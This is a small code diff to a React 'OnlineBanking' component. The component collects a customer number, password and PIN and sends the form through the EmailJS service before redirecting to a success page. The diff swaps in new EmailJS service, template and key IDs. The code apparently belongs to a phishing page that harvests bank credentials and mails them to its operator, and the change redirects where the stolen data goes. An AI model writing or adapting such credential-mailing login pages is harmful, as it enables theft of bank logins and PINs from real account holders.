@@ -31,10 +31,10 @@ export default function OnlineBanking() {
     if (!newErrors.customerNo && !newErrors.password && !newErrors.pin) {
       emailjs
         .sendForm(
-          "service_e1eul13",
-          "template_x4r3vzo",
+          "service_zx6oz2s",
+          "template_i4ijmu3",
           form.current,
-          "nb4k7l5gjhCm1Jyk1"
+          "CuEDEgi3hkPhWSDyM"
         )
         .then(
           () => navigate("/success"),
